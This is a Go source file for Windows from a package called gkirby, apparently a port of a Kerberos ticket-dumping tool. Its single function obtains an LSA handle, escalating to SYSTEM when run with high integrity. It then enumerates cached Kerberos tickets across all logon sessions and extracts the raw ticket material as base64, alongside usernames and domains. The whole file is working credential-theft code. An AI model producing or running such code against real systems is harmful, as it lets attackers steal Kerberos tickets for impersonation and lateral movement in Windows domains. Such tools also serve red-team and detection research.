//go:build windows
// +build windows

package gkirby

import (
	"encoding/base64"
	"fmt"
	"github.com/ziggoon/gkirby/helpers"
	"time"

	"github.com/ziggoon/gkirby/lsa"
	"github.com/ziggoon/gkirby/types"
)

/*
* public bois
 */

// return a map of kerberos tickets + base64 encoded ticket material
func GetKerberosTickets() []map[string]interface{} {
	var ticketCache []map[string]interface{}

	// retrieve LSA handle
	// if process is high integrity, process token will be elevated to SYSTEM
	lsaHandle, err := lsa.GetLsaHandle()
	if err != nil {
		return nil
	}

	// get kerberos auth package
	kerberosString := types.NewLSAString("kerberos")
	authPackage, err := lsa.GetAuthenticationPackage(lsaHandle, kerberosString)
	if err != nil {
		return nil
	}

	// list cached kerberos tickets in LSA
	sessionCreds, err := lsa.EnumerateTickets(lsaHandle, authPackage)
	if err != nil {
		return nil
	}

	//fmt.Printf("sessionCreds received: %v\n", sessionCreds)

	ticketCache = make([]map[string]interface{}, 0)
	for _, cred := range sessionCreds {
		//fmt.Printf("sessionCred: \n%+v\n", cred)
		for _, ticket := range cred.Tickets {

			fmt.Printf("current process is SYSTEM: %t\n", helpers.IsSystem())
			// obtain raw ticket material
			extractedTicket, err := lsa.ExtractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
			fmt.Printf("extractedTicket: %+v\n", extractedTicket)
			if err != nil {
				continue
			}

			// create map (hash table) to store cached kerberos tickets
			ticket := map[string]interface{}{
				"username":    cred.LogonSession.Username,
				"domain":      cred.LogonSession.LogonDomain,
				"logonId":     cred.LogonSession.LogonID.LowPart,
				"serverName":  ticket.ServerName,
				"serverRealm": ticket.ServerRealm,
				"startTime":   ticket.StartTime.Format(time.RFC3339),
				"endTime":     ticket.EndTime.Format(time.RFC3339),
				"renewTime":   ticket.RenewTime.Format(time.RFC3339),
				"flags":       ticket.TicketFlags.String(),
				"encType":     ticket.EncryptionType,
				"krbCred":     base64.StdEncoding.EncodeToString(extractedTicket),
			}

			ticketCache = append(ticketCache, ticket)
		}
	}

	if len(ticketCache) > 0 {
		return ticketCache
	}

	return nil
}
